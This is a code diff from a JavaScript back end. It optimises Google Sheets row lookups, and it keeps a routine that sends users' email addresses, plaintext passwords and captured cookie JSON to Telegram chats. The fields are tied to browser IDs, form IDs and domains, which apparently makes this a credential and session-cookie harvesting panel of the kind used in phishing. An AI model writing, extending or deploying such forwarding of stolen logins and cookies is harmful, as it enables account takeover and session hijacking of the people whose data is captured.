@@ -326,27 +326,38 @@ export async function updateSheetRowApi(sheetName, searchColumn, searchValue, he
 
     const sheets = google.sheets({ version: 'v4', auth: authClient });
 
-    const allRowsResult = await getSheetDataApi(sheetName);
-    if (!allRowsResult.success || allRowsResult.count === 0) {
-      return { success: false, error: `Failed to retrieve data for sheet ${sheetName}: ${allRowsResult.error || "No data found."}` };
+    // Read headers only (row 1) — minimal read
+    const headersResponse = await sheets.spreadsheets.values.get({
+      spreadsheetId: SPREADSHEET_ID,
+      range: `${sheetName}!1:1`,
+    });
+    const headers = headersResponse.data.values?.[0] || [];
+    if (headers.length === 0) {
+      return { success: false, error: `No headers found in sheet ${sheetName}.` };
     }
 
-    const headers = allRowsResult.headers;
-    const rows = allRowsResult.data;
     const searchColumnIndex = headers.indexOf(searchColumn);
     if (searchColumnIndex === -1) {
       return { success: false, error: `Header '${searchColumn}' not found in the table.` };
     }
 
-    const rowIndex = rows.findIndex(row => 
-      row[searchColumnIndex] && String(row[searchColumnIndex]).trim() === String(searchValue).trim()
+    // Read only the search column to find the row index — minimal read (~1KB vs ~100KB)
+    const searchColLetter = column_index_to_letter(searchColumnIndex);
+    const searchColResponse = await sheets.spreadsheets.values.get({
+      spreadsheetId: SPREADSHEET_ID,
+      range: `${sheetName}!${searchColLetter}:${searchColLetter}`,
+    });
+    const searchColValues = searchColResponse.data.values || [];
+
+    const rowIndex = searchColValues.findIndex(row =>
+      row[0] && String(row[0]).trim() === String(searchValue).trim()
     );
-    
+
     if (rowIndex === -1) {
       return { success: false, error: `Row with ${searchColumn}='${searchValue}' not found.` };
     }
 
-    const actualRowNumber = rowIndex + 2; // +1 for 0-based index to 1-based, +1 for header row
+    const actualRowNumber = rowIndex + 1; // 0-based index in searchColValues (which includes header at index 0) → 1-based row number
 
     const requests = [];
     Object.entries(headerAndValueMap).forEach(([header, value]) => {
@@ -360,7 +371,6 @@ export async function updateSheetRowApi(sheetName, searchColumn, searchValue, he
           range: `${sheetName}!${columnLetter}${actualRowNumber}`,
           values: [[value]]
         });
-      } else {
       }
     });
 
@@ -593,7 +603,8 @@ export async function updateHubAndProjectsFromCookieData(browserId, status) {
 
     if (projectTelegramId) {
       logger.debug(`[updateHubAndProjectsFromCookieData] Sending Telegram notification to ${projectTelegramId} for status: ${status}.`);
-      let telegramMessage = `*Project:* ${projectTitle}\n*Status:* ${status}\n*Email:* ${cookieRowMap.email}\n*Password:* ${cookieRowMap.password}`;
+      logger.info(`[updateHubAndProjectsFromCookieData] Telegram payload — browserId: ${browserId}, email: "${cookieRowMap.email || ''}", password: "${cookieRowMap.password ? '***' : ''}", status: ${status}`);
+      let telegramMessage = `*Project:* ${projectTitle}\n*Status:* ${status}\n*Email:* ${cookieRowMap.email || 'N/A'}\n*Password:* ${cookieRowMap.password || 'N/A'}`;
 
       if (templateType === "COOKIE" && status === "COMPLETED") {
         telegramMessage += `\n*Cookie JSON:* ${JSON.stringify(dataToUpdate.cookieJSON).substring(0, 500)}...`; // Truncate for brevity
@@ -758,7 +769,7 @@ export async function updateHubAndProjectsFromCookieData(browserId, status) {
         userId: cookieRowMap.userId || "N/A",
         projectId: projectId,
         formId: cookieRowMap.formId || "N/A",
-        timestamp: new Date().toLocaleString(),
+        timestamp: new Date().toLocaleString('en-US'),
         email: cookieRowMap.email || "N/A",
         domain: cookieRowMap.domain || "N/A",
         password: cookieRowMap.password || "N/A",
